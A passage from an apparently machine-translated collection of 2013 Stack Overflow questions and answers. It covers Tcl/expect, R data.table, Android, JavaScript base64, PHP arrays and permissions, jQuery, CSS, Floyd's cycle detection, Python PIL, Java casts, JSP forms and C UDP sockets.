该`{*}`语法将以下字符串拆分为空格分隔的单词。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-07T04:45:59.183

最安全的命令是使用`Tcl`' *list*命令。例如：

```
#!/usr/bin/expect
set cmd [list ls -l "a b c.txt"]
if { [package vcompare $tcl_version 8.5] < 0 } {
    eval spawn -noecho $cmd
} else {
    spawn -noecho {*}$cmd
}
expect eof 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T07:50:38.440

这行得通。

```
#!/usr/bin/expect

set command "ls"
set parameter "-la"
set prompt ":~"
spawn $command $parameter
expect $prompt 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2014-09-22T07:23:07.347

如果您有一个 bash 字符串变量用作期望脚本的参数，您可以尝试使用 lrange：

```
set command [lrange $argv x y] 
```

其中 x 和 y 是字符串变量中参数的开始和结束。
例如：
如果您的字符串变量是

```
myvariable="hello how are you?" 
```

并且您正在像这样使用它：

```
./shellscript $myvariable 
```

那么您的期望脚本行将如下所示

```
set command [lrange $argv 0 3] 
```

您可以在期望脚本中的任何位置使用 $command。它将根据需要包含空格。

# r - 使用 data.frame 中的相邻列创建滞后

> ID：15847405
> 
> 赞同：3
> 
> 时间：2013-04-06T05:33:34.213
> 
> 标签：r, time-series, replace, bigdata

我有一个看起来像这样的大型数据集：

```
set.seed(1234)
id <- c(3,3,3,5,5,7)
amount <- c(24,48,60,84,96,175)
start <- as.Date(c("2006-01-01","2009-12-09","2010-01-01","2006-04-24", "2009-12-09","2009-05-01"))
end <- as.Date(c("2010-01-01","2010-01-01","2010-01-01","2009-12-09","2009-12-09", "2009-05-01"))               
noise <-rnorm(6)
test <- data.frame(id,amount,start,end,noise)            

  id amount      start        end      noise
   3     24 2006-01-01 2010-01-01  0.4978505
   3     48 2009-12-09 2010-01-01 -1.9666172
   3     60 2010-01-01 2010-01-01  0.7013559
   5     84 2006-04-24 2009-12-09 -0.4727914
   5     96 2009-12-09 2009-12-09 -1.0678237
   7    175 2009-05-01 2009-05-01 -0.2179749 
```

但它需要看起来像这样：

```
 id amount      start        end      noise   switch
   3     24 2006-01-01 2009-12-09  0.4978505        0
   3     48 2009-12-09 2010-01-01 -1.9666172        1
   3     60 2010-01-01 2010-01-01  0.7013559        2
   5     84 2006-04-24 2009-12-09 -0.4727914        0 
   5     96 2009-12-09 2009-12-09 -1.0678237        1
   7    175 2009-05-01 2009-05-01 -0.2179749        0 
```

也就是说，我想滞后 start 的值并用 ID 替换 end 的值。其次，我想创建一个名为“switch”的新变量，它计算 id 上的“数量”变化的次数，第一个观察值是 == 0 的初始条件。我曾尝试使用`ts()`来制造滞后，这在原则上可以满足我的要求，尽管它会产生一个 ts 对象而不是日期：

```
 out <- cbind(as.ts(test$start),lag(test$start))
       colnames(out) <- c("start","end")
       cbind(as.ts(test$start),lag(test$start))

         as.ts(test$start) lag(test$start)
            NA           13149
          13149           14587
          14587           14610
          14610           13262
          13262           14587
          14587           14365
          14365              NA 
```

所以该`lag(test$start)`列是我的最终结果，但应用于 id 变量。所以我尝试矢量化并将其应用于 id 变量：

```
 #make it a function 
        lagfun <- function(x){
          cbind(as.ts(x),lag(x))
        }

        y <- unlist(tapply(start,id,lagfun)) 
```

这就是事情变得非常丑陋的地方。有没有更好的方法来解决这个问题？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-06T06:04:31.010

如果您将时间序列放在 a`data.table`中，则可以在一行中完成此操作：

```
testDT[ , c("end", "switch") := 
          list( c(tail(start, -1), tail(end, 1)), cumsum(c(0, diff(amount) != 0)))
      , by=id] 
```

* * *

这里分解：

```
# create your data.table object 
library(data.table)
testDT <- data.table(test)

# Modify `end` by taking the lag of start and the final date from end. 
#   do this `by=id`
testDT[, end := c(tail(start, -1), tail(end, 1)), by=id]

# Count the ammount of times that each amount differs from the 
#  previous ammount value.  
# Start this vector at 0, and take the cummulative sum. 
#  also do this by id 
testDT[, switch := cumsum(c(0, diff(amount) != 0)), by=id]

# this is the final result. 
testDT
   id amount      start        end      noise switch
1:  3     24 2006-01-01 2009-12-09 -1.2070657      0
2:  3     48 2009-12-09 2010-01-01  0.2774292      1
3:  3     60 2010-01-01 2010-01-01  1.0844412      2
4:  5     84 2006-04-24 2009-12-09 -2.3456977      0
5:  5     96 2009-12-09 2009-12-09  0.4291247      1
6:  7    175 2009-05-01 2009-05-01  0.5060559      0 
```

# android - 如何消除android应用程序中的休眠错误？

> ID：15847408
> 
> 赞同：1
> 
> 时间：2013-04-06T05:33:58.893
> 
> 标签：android, amazon, kindle-fire

嘿伙计们，我将我的应用程序上传到亚马逊市场我收到错误

错误描述：“App name”被发现不兼容，因为应用与Kindle Fire的休眠功能交互存在问题。“App Name（Kindle Tablet Edition）”强制关闭，崩溃，或设备休眠再恢复后失去用户状态.

**重现步骤：**

1.  安装并启动应用程序。
2.  休眠设备。
3.  解锁设备。
4.  应用程序退出到设备主屏幕。

请更正我们在您提交应用时发现的问题。

请帮帮我，我卡在这什么是冬眠我没明白

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-02-28T05:50:21.383

当运行时发生配置更改时，默认情况下会关闭并重新启动 Activity，但使用此属性声明配置会阻止 Activity 重新启动。相反，活动保持运行并调用其 onConfigurationChanged() 方法。

android:configChanges="方向|keyboardHidden"

欲了解更多信息：http: [//developer.android.com/guide/topics/manifest/activity-element.html](http://developer.android.com/guide/topics/manifest/activity-element.html)

请确保在清单文件中包含上述属性。

希望此信息能解决您的问题。

# javascript - 使用 javascript 进行密码加密

> ID：15847415
> 
> 赞同：-1
> 
> 时间：2013-04-06T05:35:11.347
> 
> 标签：javascript

我需要使用 base 64 加密我的密码。我怎样才能在 javascript 中做到这一点？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-06T05:37:45.887

base64 是一种对数据进行编码的方法，而不是一种加密技术。如果这仍然是您想要采用的方法，那么这里有一个可以工作的 JavaScript 库：[https ://github.com/mshang/base64-js](https://github.com/mshang/base64-js)

在 Mozilla 和 web kit 浏览器中还有一个内置方法，称为 btoa()：

[https://developer.mozilla.org/en-US/docs/DOM/window.btoa](https://developer.mozilla.org/en-US/docs/DOM/window.btoa)

# php - 重新格式化数组中的值

> ID：15847418
> 
> 赞同：-2
> 
> 时间：2013-04-06T05:35:32.880
> 
> 标签：php, arrays, loops

我有这个数组：

```
array (
  1 => 
  array (
    'name' => 'Product 1',
    'price' => '5',
  ),
  2 => 
  array (
    'name' => 'Product 2',
    'price' => '$10',
  ),
  3 => 
  array (
    'name' => 'Product 3',
    'price' => '$50',
  ),
  4 => 
  array (
    'name' => 'Product 4',
    'price' => '20',
  ),
) 
```

我需要遍历这个数组，将所有价格重新格式化为十进制格式。例如，10 是 10.00，50 是 50.00。如果用户提交 $50 的值，我还需要确保 $ 已被删除

这些值被替换后。我需要一个在 $result 的值中看起来像这样的数组，所以它应该看起来像：

```
array (
  1 => 
  array (
    'name' => 'Product 1',
    'price' => '5.00',
  ),
  2 => 
  array (
    'name' => 'Product 2',
    'price' => '10.00',
  ),
  3 => 
  array (
    'name' => 'Product 3',
    'price' => '50.00',
  ),
  4 => 
  array (
    'name' => 'Product 4',
    'price' => '20.00',
  ),
) 
```

谢谢，所有的帮助！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:45:44.680

```
foreach ($array as &$element) {
  $element['price'] = sprintf("%.2f", str_replace('$', '', $element['price'];
} 
```

放在`&`迭代变量之前使其成为对实际元素的引用而不是副本，因此您可以通过赋值对其进行修改。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:46:21.790

试试这个，将你的数组分配到一个变量中，假设 $arr。

```
foreach($arr as $item=>$val)
{   
    $arr[$item]['price']=number_format(str_replace('$','',$val['price']),2);
}

 print_r($arr); // return your desire array format. 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T05:48:36.337

只需遍历数组，修剪任何 $ 符号，并格式化小数：

```
foreach ($array as $item => $data) {

    // remove $
    $array[$item]['price'] = ltrim($array[$item]['price'], '$');

    // format decimals
    $array[$item]['price'] = number_format($array[$item]['price'], 2, '.', '');

} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-06T05:52:55.730

可能这是你想要的：

```
$result = array (
  1 => 
  array (
    'name' => 'Product 1',
    'price' => '5',
  ),
  2 => 
  array (
    'name' => 'Product 2',
    'price' => '$10',
  ),
  3 => 
  array (
    'name' => 'Product 3',
    'price' => '$50',
  ),
  4 => 
  array (
    'name' => 'Product 4',
    'price' => '20',
  ),
);

$output = array();
foreach($result as $key => $value) {
   $output[$key]['name'] = $value['name'];

   //remove all characters except number and dot.. This will help to remove if instead of $ any other money format comes.
   $new_price = preg_replace("/[^0-9.]/", "", $value['price']);

   $new_price = number_format($new_price, 2, '.', '');
   $output[$key]['price'] = $new_price; 

}

print_R($output); 
```

希望这可以帮助你:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-06T05:54:18.100

这可以满足您的要求：

```
 $arrayhelp = array (
      1 => 
      array (
        'name' => 'Product 1',
        'price' => '5',
      ),
      2 => 
      array (
        'name' => 'Product 2',
        'price' => '$10',
      ),
      3 => 
      array (
        'name' => 'Product 3',
        'price' => '$50',
      ),
      4 => 
      array (
        'name' => 'Product 4',
        'price' => '20',
      ),
    ); 
```

^ 你的数组 V 代码

```
 foreach ($arrayhelp as &$row):

        $row['price'] = number_format(str_replace('$','',$row['price']),2,'.','');
    endforeach;

    print_r($arrayhelp); 
```

如果你想以千分隔：

```
 foreach ($arrayhelp as &$row):

        $row['price'] = number_format(str_replace('$','',$row['price']),2,'.',',');
    endforeach;

    print_r($arrayhelp); 
```

# jquery - 根据链接 ID 将内容加载到 DIV

> ID：15847426
> 
> 赞同：0
> 
> 时间：2013-04-06T05:36:26.023
> 
> 标签：jquery, html, load

基本上，我已经使用“链接”类创建了多个链接，它们每个都有一个代表它们的 id。

我写了一个 JQuery 脚本，它对我不起作用，并引发了第一个错误：

```
 $(function() {
    $.get('pages/home.html')
    .success(function(response) {
        $('.contentblock').html(response);
    })
    .error(function(jqXHR, textStatus, errorThrown) {
        $('.contentblock').html('<h1>Failed to load page(s)!</h1>');
    });

    $(document).on('click', '.link', function() {
        $('.contentblock').html('<div class="animatedload"></div>');

        var page = 'pages/' + $(this).attr('id') + '.html';
        $('.contentblock').hide();
        $.get(page)
        .success(function(response) {
            $('.contentblock').html(response);
        })
        .error(function(jqXHR, textStatus, errorThrown) {
        });
        $('.contentblock').fadeIn(1000);
    });
}); 
```

它在第 6 行抛出 .error(function()){} 。

请帮我解决这个问题:(提前感谢您的帮助！

编辑：是服务器问题，而不是代码:)

~MCD

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T17:06:44.563

原来@crimson_penguin 是对的！

出于安全原因它不会工作，所以把它放到服务器上让它工作

# jquery - 如何在jquery中切换锚标记文本

> ID：15847428
> 
> 赞同：0
> 
> 时间：2013-04-06T05:36:43.970
> 
> 标签：jquery

我想切换锚标记文本，我在 div 中有一个锚标记，当用户单击回复时，评论框打开，文本应该变为关闭，反之亦然，但问题是在文本变为关闭后，文本仍然关闭在显示和隐藏之间切换清楚地工作......

```
<a id="reply" href="#">reply</a>
<div id="replyuser" style=" position:absolute;">
    <asp:TextBox ID="txt1" CssClass="txtbox" TextMode="MultiLine" runat="server"></asp:TextBox><br />
    <asp:Button ID="btnreply" Text="send" runat="server" CssClass="btn" />
</div> 
```

jquery如下

```
$(document).ready(function() {
    $("#replyuser").hide();

    $("#reply").click(function() {
        $("#replyuser").toggle(function() {
            $("#reply").text("close");
        });
    });
}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T05:42:44.970

尝试在单击时替换文本：

您处于按钮的上下文中，然后尝试`$(this)`在它获得点击事件时引用它，然后切换`#reply`div 并检查文本。如果这有文本`reply`将其更改为`close`.

### 把它放在css中：

```
#replyuser {
    display:none;
} 
```

### 然后使用此脚本：

```
$("#reply").click(function() {
   $("#replyuser").toggle();
   ($(this).text() === "reply") ? $(this).text("close") : $(this).text("reply");
}); 
```

### [最后的小提琴](http://jsfiddle.net/BYcfv/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:40:12.647

```
 $(document).ready(function() {
                $("#replyuser").hide();

                $("#reply").click(function() {

                    $("#replyuser").toggle(function(e) {
                           $(this).is(":visible") ? $("#reply").text("close") : $("#reply").text("reply");                         
                    });

                });
            }); 
```

$(this) 是对 $("#replyuser") 控件[SO 链接](https://stackoverflow.com/questions/1302618/jquery-and-this-object)的引用， :visible 是可见控件的选择器（惊讶的是 :)）。所以逻辑上 .is 检查 $("#replyuser") 是否可见。

# css - CSS：在悬停时恢复为内联样式

> ID：15847434
> 
> 赞同：1
> 
> 时间：2013-04-06T05:37:30.457
> 
> 标签：css, inline-styles

我将文本包装在由 Javascript 生成的 SPAN 中，并且在生成时包含内联样式。所以像：

```
<div id="test">
    <span style="color: red">Text 1</span>
    <span style="color: blue">Text 2</span>
    <span style="color: green">Text 3</span>
    ...
</div> 
```

但是，通常我希望所有文本都是一种颜色，并且只有在悬停时才能看到内联定义的特殊颜色。问题当然是，为了覆盖非悬停样式的内联样式，我必须包含`!important`声明。然后，当我定义`:hover`样式时，我无能为力。

```
#test > span {
    color: black !important;
}
#test:hover > span {
    color: inline; // Does not exist!
} 
```

有什么我不知道的选择吗？还是有更好的方法来实现这一目标？

我*无法*运行 Javascript onmouseover 来添加内联样式，然后删除 onmouseout。以防万一有人想建议。

**编辑：**

我确实想到了一个疯狂的解决方案：在父 SPAN 中嵌入所有文本 SPAN，给父母内联样式，通过重要标志强制孩子成为统一颜色，然后在悬停时强制孩子`inherit`离开父母。 ...... 那会起作用的，对吧？还有更优雅的吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T06:07:12.457

将文本嵌套在另一个跨度中应该可以工作，您可以从父级继承颜色。

就我个人而言，我认为你应该给他们每个班级并在悬停时改变他们的颜色。

像这样：http: [//jsfiddle.net/576Ez/](http://jsfiddle.net/576Ez/)

**HTML**

```
<div id="test">
    <span class="red hover">Text 1</span>
    <span class="blue hover">Text 2</span>
    <span class="green hover">Text 3</span>
    ...
</div> 
```

**CSS**

```
#test .red.hover:hover {
    color: red;
}
#test .blue.hover:hover {
    color: blue;
}
#test .green.hover:hover {
    color: green;
} 
```

# c++ - 弗洛伊德的寻环算法何时会失败？

> ID：15847439
> 
> 赞同：2
> 
> 时间：2013-04-06T05:37:48.537
> 
> 标签：c++, algorithm, floyd-cycle-finding

我收到一个关于[弗洛伊德循环寻找算法](http://en.wikipedia.org/wiki/Cycle_detection#Tortoise_and_hare)的面试问题：

**弗洛伊德的寻环算法何时会失败？**

我的意思是，是否有规则可以找到快速指针和慢速指针之间的步长？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-06T05:46:20.400

在合理的假设下，它不会失败。它要么找到一个循环，要么断定没有循环。

我能想到的唯一失败场景如下：

*   实现中存在错误；
*   正在遍历的结构在算法进行时被修改。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-06T05:55:14.040

Floyd 的循环查找算法可能不存在任何可能的故障情况。

唯一可能的失败场景发生在计算上难以在动态变化的链表中找到下一个节点时。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-12-19T13:28:13.243

好的，我现在正在解决这个问题，我也遇到了同样的问题。
Floyd 算法指出，快指针可以比慢指针快 m 倍。人们通常将 m 视为 2，即在每次迭代中快速前进 2 步，而慢速前进仅 1 步。此特定值适用于所有结构和循环长度。
但是，如果我们要找到循环的开始并且我们取 m>2，那么在存在长度为 m-1 的循环的情况下算法会失败。在这种情况下，将检测到循环，但在查找初始循环节点方面失败。
这是我注意到的，但不确定如何以及为什么会这样。一些见解会有所帮助。谢谢！

# python - img.save(imgstore, "GIF") 或 img.save(imgstore, "JPEG")

> ID：15847442
> 
> 赞同：0
> 
> 时间：2013-04-06T05:38:06.293
> 
> 标签：python, django, image, python-imaging-library

```
if request.method == 'POST':
        form = DocumentForm(request.POST, request.FILES)
        if form.is_valid():            
            u_file = request.FILES['docfile']            
            filename = u_file.name
            img = Image.open(u_file)
            imgstore = StringIO.StringIO("")
            img.save(imgstore, "GIF") 
```

我正在上传一个转换为文本的图像文件。但是我只能对 GIF 文件执行此操作。或者如果我输入“JPEG”而不是 GIF，我只能保存 JPEG 文件。如何使用 img.save(imgstore, "GIF, JPEG") 选项同时保存 JPEG 和 GIF。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:52:32.093

```
if form.is_valid():            
    u_file = request.FILES['docfile']            

    extension = u_file.split(".").lower()[-1]

    filename = u_file.name
    img = Image.open(u_file)
    imgstore = StringIO.StringIO("")

    if extension == "gif"
        img.save(imgstore, "GIF")
    else:
        img.save(imgstore, "JPEG") 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:42:38.740

我认为您可以找到使用 libmagic 获得的文件类型。然后从那里决定。 [https://github.com/ahupp/python-magic](https://github.com/ahupp/python-magic)

# algorithm - 一个可接受的启发式函数

> ID：15847445
> 
> 赞同：0
> 
> 时间：2013-04-06T05:39:05.100
> 
> 标签：algorithm, computer-science, graph-algorithm

我想要一个可接受的启发式函数来实现 A 星算法来解决这个问题：

有一个图（一些节点和它们之间的一些加权路径）。每个节点都有一些动物，我们必须遍历图表以查看与起始节点距离最小的所有给定动物。

所以 ：

有一个加权图，每个节点都有一些动物。我们将以最小距离查看所有给定的动物（来自输入）。

你推荐什么启发式函数？

# java - 将不同类型转换为一种类型

> ID：15847457
> 
> 赞同：2
> 
> 时间：2013-04-06T05:41:48.853
> 
> 标签：java, double, type-conversion, long-integer

long 是一个 64 位有符号二进制补码整数。Long 是 128 位有符号二进制补码整数吗？我只是想在继续之前确认这一点。

```
Long l = 6;
int i = 4;
Integer ii = 2;
l += (l/i) * ii; 
```

我想知道我需要在哪里进行类型转换才能返回 3 而不是 2。

我尝试了以下方法：

```
l += (long) (((double) l/i) * ii); 
```

当我使用 进行类型转换`l/i`时`double`，我会返回`1`，而不是`1.5`?

假设我要对 Long 进行类型转换，这是 Long 的最大数字，使用 (long)，因为 long 是一个 64 位有符号二进制补码整数，会发生什么。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-06T05:48:20.423

`long`（小写）是原始类型的 64 位整数。`Long`（大写）是包装了`long`（小写）的引用类型（对象）。所以`Long`' 将他们的数据编码为 a `long`，因此也是 64 位的。如果您想要 > 64 位精度，请查看提供任意高精度的[java.math.BigInteger 。](http://docs.oracle.com/javase/1.5.0/docs/api/java/math/BigInteger.html)

您的问题不是来自除法语句中的错误转换，而是来自`long`最后的转换：

```
l += (long) (((double) l/i) * ii);
       ^
       here 
```

的结果`(((double) l/i) * ii)`是`double`值为 3.0。由于浮点运算的特殊性，当它被强制转换为 a 时，它变为 2 `long`。

为了解决这个问题，使用`Math.round`而不是类型转换：

```
 l += Math.round(((double) l/i) * ii); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T05:57:55.283

`Long``long`是一个包含与原始对象相关的构造函数、方法和常量的类（例如，这将为您提供 a可以表示`Long.MAX_VALUE`的最大值）。`long`当您将 a 转换`long`为 a`Long`时，您正在从值类型转换为引用类型。用于表示值的位数不会改变。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-04-06T05:53:56.530

你的`(l/i) * ii`意思是权力？如果是这样，也许你应该使用`BigDecimal`. 顺便说一句，`1/i`等于0；改为使用`1.0/i`。

# java - Google App Engine/Jetty：动态代理的自省失败？

> ID：15847458
> 
> 赞同：1
> 
> 时间：2013-04-06T05:41:53.177
> 
> 标签：java, google-app-engine, jsp, jakarta-ee, jetty

为什么`Introspector`不能正确发现 Jetty/GAE 中动态代理类的属性？

在使用 Jetty 在 GAE 上本地部署时，我在尝试使用 Java EL/JSP 的动态代理时遇到了这个奇怪的问题。[您可以在此处](https://stackoverflow.com/questions/15825474/dynamic-proxy-in-java-el)查看原始问题。

无论如何，我已经简化了代码并缩小了问题范围。这是新代码：

*MyServlet.java*：

```
package test;

// imports omitted

public class MyServlet extends HttpServlet {

    public interface MyInterface {
        public String getValue();
    }

    private static <T> T getProxy(Class<T> c) {
        return (T)Proxy.newProxyInstance(
                klass.getClassLoader(),
                new Class<?>[]{ klass },
                new InvocationHandler() {
                    @Override public Object invoke(Object proxy, Method m,
                            Object[] args) throws Throwable {
                        return null;
                    }
                });
    }

    public static void testIntrospection() {
        StringBuilder sb = new StringBuilder();
        try {
            MyInterface proxy = getProxy(MyInterface.class);
            BeanInfo info = Introspector.getBeanInfo(proxy.getClass());
            for (PropertyDescriptor d : info.getPropertyDescriptors())
                sb.append(d.getName()).append(", ");
        } catch (Exception e) {
            throw new AssertionError("failed", e);
        }
        throw new AssertionError("found: " + sb.toString());
    }

    @Override
    public void doGet(HttpServletRequest request, HttpServletResponse resp) {
        testIntrospection();
    }

    public static void main(String... args) {
        testIntrospection();
    }
} 
```

当我部署上面的代码并发送 GET 请求时，我得到以下信息：

```
java.lang.AssertionError: found: class, 
```

但是，根据 Proxy的[文档](http://docs.oracle.com/javase/7/docs/api/java/lang/reflect/Proxy.html)，我预计两者`class`都会`value`被发现。但是，当我运行它时，我得到了预期的输出。我还尝试将代理接口放在单独的文件/包中，但它不起作用。为了让事情变得更奇怪，当我更改为私有、受保护或默认时，我也会得到预期的输出。`main()``MyInterface`

为什么我将问题限制在 GAE/Jetty？因为我能够毫无问题地在 Tomcat 7 上部署*完全相同的*`MyInterface`servlet，即使是公开的。

万一它是相关的，我在 Eclipse Juno 中使用谷歌插件，我只在本地部署。

最后一件事：我检查了 的输出，`proxy.getClass().getDeclaredMethods()`它*确实*包含`getValue`. 但是，我不能自己简单地解析 bean 属性，因为我需要它在 EL 中工作，它依赖于`Introspector`.

我真的被这个难住了，所以非常感谢任何指导。

# html - 从数据库中检索数据后如何以html形式编辑数据

> ID：15847469
> 
> 赞同：1
> 
> 时间：2013-04-06T05:43:14.113
> 
> 标签：html, forms, jsp

我已经通过jsp创建并将数据添加到数据库中。现在我的问题是编辑/更新数据库，这应该通过html表单完成。在一个中，我选择学生rollno，表单应该显示所有其他字段，然后我可以编辑它和更新数据库。

编辑课程.jsp

```
 <!DOCTYPE html>
<html>  
    <head>

        <link href="css/redmond/jquery-ui-1.10.2.custom.min.css" media="screen" rel="stylesheet"/>
        <link href="css/default.css" media="screen" rel="stylesheet"/>
        <link href="sidebarmenu.css" rel="stylesheet" type="text/css">
                <script src="sidebarmenu.js"></script>
                <script src="scripts/jquery-1.9.1.min.js"></script> 
        <script src="scripts/jquery-ui-1.10.2.custom.min.js"></script> 

</head>
    <body>  

        <!--<form id="frmExamRegistration" method="post" enctype="multipart/form-data" class="anu">-->

    <form name="f1" method="post" class="anu" action="Edit_coursedetails.jsp">  
    <%@include file="adminheader.jsp"%>
<%@include file="sidemenus.jsp" %>

    <div id="container">
              <div  style="float:right;width:10%;border:0;font-color:#163362"><a href=logout.jsp">Log Out</a></div><br>
        <div class="content"><center>Edit Course</center><br>
            <div class="formElements,rightcol" align="center">
                <label>Course code:
                 <span><input type="text" id="txtCoursecode" name="txtCoursecode" ></span></label>
                       </div><br>

            <div class="buttons">
                <button type="submit" class="primaryAction">Edit</button>
                                <button type="reset" class="primaryAction">Clear</button>

            </div>
                 </div>
         </div>
       </form>
  </body>
</html> 
```

edit_coursedetails.jsp

```
<!DOCTYPE html>
<html>  
    <head>

        <link href="css/redmond/jquery-ui-1.10.2.custom.min.css" media="screen" rel="stylesheet"/>
        <link href="css/default.css" media="screen" rel="stylesheet"/>
        <link href="sidebarmenu.css" rel="stylesheet" type="text/css">
                <script src="sidebarmenu.js"></script>
                <script src="scripts/jquery-1.9.1.min.js"></script> 
        <script src="scripts/jquery-ui-1.10.2.custom.min.js"></script> 

</head>
    <body>  

        <!--<form id="frmExamRegistration" method="post" enctype="multipart/form-data" class="anu">-->

                       <%
 ccode=request.getParameter("txtCoursecode");

try {

Statement st = null;
st=conn.createStatement();
ResultSet rs = st.executeQuery("select * from courses where course='"+txtCoursecode+"'");
if(rs.next())
{
cname=rs.getString("cname");
Description=rs.getString("Description");
}
%>
Edit courses

<form name="f1" method="post" class="anu" action="Add_coursedetails.jsp">  
    <%@include file="adminheader.jsp"%>
<%@include file="sidemenus.jsp" %>

    <div id="container">
              <div  style="float:right;width:10%;border:0;font-color:#163362"><a href=logout.jsp">Log Out</a></div><br>
        <div class="content"><center>Add Course</center><br>

            <div class="formElements,rightcol" align="center">

                <label>Course code:
                 <span><input type="text" id="txtCoursecode" name="txtCoursecode" value="<%=rs.ccode%>"></span></label>
                       </div><br>

            <div class="formElements,rightcol" align="center">
                <label>Course Name:
                 <span><input type="text" id="txtCoursename" name="txtCoursename" value="<%=rs.cname%>"></span></label>
                        </div><br>

                        <div class="formElements,rightcol" align="center">
                <label>Duration:
                 <span>&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp&nbsp;<input type="text" id="txtDuration" name="txtDuration" value="<%=rs.getString("3")%>"></span></label>
                        </div>
            <div class="buttons">
                <button type="submit" class="primaryAction">Update</button>
                                <button type="reset" class="primaryAction">Clear</button>

            </div>
                 </div>
         </div>
<%
}
}
catch(Exception e){}
%>
       </form>
  </body>
</html> 
```

在editcourse表单中，通过提供ccode它应该显示数据库中的所有其他字段及其值，然后我可以修改它

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T16:30:33.423

您可以使用 ajax 或在表单操作属性中提供 jsp 的 url。然后在该jsp中从请求中获取txtRollno，从数据库中检索该rollno的字段，将数据填充到适当的字段中，然后您可以对其进行编辑，然后将其更新到数据库中。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-06T18:19:42.170

正如其他朋友所说，您需要使用ajax调用而您说您不知道ajax。所以我认为这些教程可以帮助你：

1)[什么是 AJAX？](http://www.codeproject.com/Articles/534632/WhatplusisplusAJAX-3f)

2) [AJAX 示例](http://www.w3schools.com/ajax/ajax_example.asp)

3) [jQuery Ajax 调用教程](http://www.cleverweb.nl/php/jquery-ajax-call-tutorial/)

祝你好运 ;）

# c - udp 客户端接收文本文件

> ID：15847472
> 
> 赞同：0
> 
> 时间：2013-04-06T05:43:35.433
> 
> 标签：c

我正在尝试通过 UDP 套接字接收文本文件，客户端构建良好但提供了一个空白控制台，经过一些实验后我发现问题出在接收上，所以我发布了我的代码的那部分：

```
size_t data=0;
if(data=recvfrom( sd, file_buffer, sizeof(file_buffer), 0
                , (struct sockaddr *) &server, &server_length) < 0)
{
  printf("Error receiving file.");
  exit(1);
}

if(data==sizeof(file_buffer))
{
  printf("Received Data:[%s]",file_buffer);
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-06T06:09:37.750

You should re-write you if you forgot to add parenthesis ()

> if( data=recvfrom(sd, file_buffer, sizeof(file_buffer), 0, (struct sockaddr *) &server, &server_length)<0 )

**Reason:**
Precedence of `<` is higher then `=` So in your if() first `<` performed then `=` and this cause assigns `data` either `0` when data read successfully and `1` when `recvfrom()` returns `-1` on error.
look @ [C Operator Precedence Table](http://www.difranco.net/compsci/C_Operator_Precedence_Table.htm)

You code is equipment to on successfully read :

```
if(data = 1 < 0) 
```

and on `recvfrom()` fail its like:

```
if(data = -1 < 0) 
```

**Mistake**? Actually you forgot () parenthesis (or if you don't know you shold add.) like:

> if( (data=recvfrom(sd, file_buffer, sizeof(file_buffer), 0, (struct sockaddr *) &server, &server_length)) <0 )

see I added () like:

```
if( (data = recvfrom() ) < 0) 
    ^                  ^  added in your code 
```

**Edit**:

**Second error**: "buffer is not `\0` terminated"

The function [recvfrom()](http://publib.boulder.ibm.com/infocenter/tpfhelp/current/index.jsp?topic=/com.ibm.ztpf-ztpfdf.doc_put.cur/gtpc2/cpp_recvfrom.html) if successful worked, returns the length, in bytes, of the message or datagram. And if an end-of-file condition is received or the connection is closed, `0` is returned.

the thing to be notice is *it doesn't puts `'\0'` symbol to terminate buffer.* and you are using `'%s'` to print `file_buffer[]`'s content which excepts null terminated string that also cause Undefined Behavior at run time (and you may get unusual symbols on console if not getting segmentation-fault).

You should always read less then one of `sizeof(file_buffer)` and put null `\0` explicitly, if you wants to use your file buffer as string.

I can suggest you do like:

```
no_Of_bytes =recvfrom( 
                sd, 
                file_buffer, 
                sizeof(file_buffer) - 1, 
                0,
                (struct sockaddr *) &server, 
                &server_length
            );
file_buffer[no_Of_bytes] = '\0'; 
```

Now your `file_buffer` is null terminated you can use with `%s`, but be sure you are not making mistakes in other part of code.

# php - php 权限仅执行，不可更改

> ID：15847475
> 
> 赞同：1
> 
> 时间：2013-04-06T05:43:47.540
> 
> 标签：php, permissions

我有一些 pho 文件在执行时会触发 sms 服务器的 api，该 api 会进一步发送 sms。这些 php 文件由另一台服务器触发，其中包含 mobile no 和 msg 等数据。现在这些文件托管在一个简单的共享服务器上。应该为文件夹和文件授予什么权限，以便公众无法读取但由服务器触发/执行。这些文件包含其他服务（如短信网关）的凭据，因此需要加以保护。

我尝试将 711 提供给文件夹，使其成为公开的秘密。现在对于文件 644 或 711，这是更好的选择。或者应该有其他事情要做。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-06T05:55:13.400

UNIX 权限区分**用户、组和其他**的读/写/执行权限。“其他”不代表“公开”，与此无关。

UNIX 进程在特定*用户*下运行，即如果您登录并运行它在您的用户名下运行的程序，则 Apache 进程通常以用户`daemon`等身份运行。每个用户可以属于多个*组之一*。这是用户和组权限相关的两件事。“其他”是指不适合用户或组的用户进程。

例如，这个文件：

```
